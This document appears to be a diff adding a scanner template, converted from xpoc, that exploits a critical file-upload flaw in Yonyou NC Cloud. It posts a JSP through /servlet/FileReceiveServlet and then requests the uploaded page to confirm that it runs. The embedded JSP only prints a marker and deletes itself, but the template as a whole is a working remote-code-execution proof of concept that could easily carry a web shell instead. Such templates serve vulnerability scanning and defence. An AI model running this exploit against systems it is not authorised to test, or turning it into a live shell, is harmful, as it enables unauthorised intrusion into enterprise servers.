@@ -1,0 +1,30 @@
+id: yaml-poc-yonyou-yonyou_nc_cloud-file_upload-CT-158899
+info:
+  name: Yaml Poc Yonyou Yonyou_Nc_Cloud File_Upload Ct 158899
+  author: converted
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-yonyou-yonyou_nc_cloud-file_upload-CT-158899'
+  tags: fileupload
+  reference: []
+http:
+- method: POST
+  path:
+  - /servlet/FileReceiveServlet
+  body: '{{r3}}{{r1}}{{r4}}<%out.print("{{r2}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>'
+  headers:
+    Content-Type: multipart/form-data;
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+- method: GET
+  path:
+  - /{{r1}}.jsp
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
